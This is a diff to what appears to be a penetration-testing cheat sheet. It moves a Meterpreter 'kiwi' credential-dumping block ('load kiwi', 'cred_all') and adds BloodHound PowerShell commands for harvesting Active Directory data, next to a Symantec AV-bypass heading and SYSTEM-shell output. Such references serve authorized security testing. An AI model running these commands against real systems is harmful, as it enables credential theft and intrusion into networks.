@@ -470,10 +470,10 @@ klist tgt
 # whoami on older Windows systems
 set u
 ```
-# Kiwi collect credentials
+## BloodHound
 ```
-meterpreter > load kiwi
-meterpreter > cred_all
+powershell-import /path/to/BloodHound.ps1
+powershell Get-BloodHoundData | Export-BloodHoundCSV
 ```
 # Symantec AV Bypass
 ```
@@ -503,7 +503,11 @@ and BOOM   :D
 Server username: NT AUTHORITY\SYSTEM
 Enjoy your Session
 ```
-
+# Kiwi collect credentials
+```
+meterpreter > load kiwi
+meterpreter > cred_all
+```
 # Network
 
 ### Nmap Full Web Vulnerable Scan
